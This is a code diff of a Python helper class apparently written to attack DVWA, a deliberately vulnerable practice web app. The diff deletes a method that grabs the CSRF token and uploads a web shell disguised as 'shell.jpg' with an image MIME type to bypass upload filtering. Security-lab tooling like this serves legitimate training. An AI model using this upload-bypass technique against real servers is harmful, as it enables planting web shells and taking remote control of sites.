@@ -35,29 +35,3 @@ class Access:
             self.brute_force.set_security_level(level='high', url=DVWA_SECURITY_LEVEL_URL)
             print("Logged in successfully and security level set to high.")
         return response
-   
-    def file_upload(self, file_path, upload_url):
-        token = self.brute_force.find_user_token(self.session.get(upload_url).text)
-        with open(file_path, 'rb') as f:
-            files = {
-                'uploaded': (
-                    'shell.jpg', 
-                    f, 
-                    'image/jpeg'
-                )
-            }
-            data = {
-                'MAX_FILE_SIZE': '1000000',
-                'Upload': 'Upload',
-                'user_token': token
-            }
-            response = self.session.post(upload_url, files=files, data=data)
-        status_code = response.status_code
-        response_text = response.text
-        if status_code == 200 and "succesfully" in response_text:
-            print("Webshell uploaded successfully.")
-        else:    
-            print("Failed to upload webshell.")
-            print(f"Status Code: {status_code}\n"
-                  f"Response Text: {response_text}")
-        return status_code
